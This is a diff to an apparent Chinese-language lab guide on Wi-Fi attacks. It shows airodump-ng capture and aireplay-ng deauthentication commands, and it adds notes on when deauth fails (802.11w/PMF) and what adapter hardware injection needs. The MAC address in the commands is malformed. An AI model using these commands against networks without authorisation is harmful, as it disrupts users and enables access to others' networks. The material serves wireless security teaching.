@@ -311,6 +311,15 @@ sudo airodump-ng --bssid bc:8o:ba:f8:qa:bd -c 6 -w lab_capture wlan0mon
 sudo aireplay-ng --deauth 4 -a bc:8o:ba:f8:qa:bd -c ap-connected-client-macAddr wlan0mon
 ```
 
+注意：
+
+- deauth无法在启用了 802.11w（管理帧保护，PMF/MFP）协议，以及工作在
+5GHz/Wi-Fi 6 频段上的抗干扰机制的AP上正常工作
+- 仅支持 2.4GHz（802.11b/g/n）模式下的帧注入的USB外置网卡
+
+
+
+
 检查抓包文件
 
 ```
